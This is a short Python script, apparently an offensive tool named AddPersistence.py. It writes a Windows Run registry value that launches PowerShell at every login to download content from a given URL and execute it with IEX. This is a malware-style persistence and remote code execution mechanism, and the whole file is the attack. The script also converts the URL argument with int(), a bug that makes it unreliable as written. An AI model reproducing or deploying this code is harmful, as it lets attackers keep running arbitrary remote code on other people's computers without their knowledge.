import winreg
import sys

def add_registry_key(key_name, url):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    command = f'powershell -c "IEX (Invoke-WebRequest -Uri \\"{url}\\").Content"'

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        print("Registry key added successfully.")
    except Exception as e:
        print("Error adding registry key:", str(e))

if __name__ == '__main__':
    if len(sys.argv) != 3:
            print('Usage: python AddPersistence.py <KeyName> <URL>')
            sys.exit(1)

    keyName = sys.argv[1]
    url = int(sys.argv[2])

    add_registry_key(keyName, url)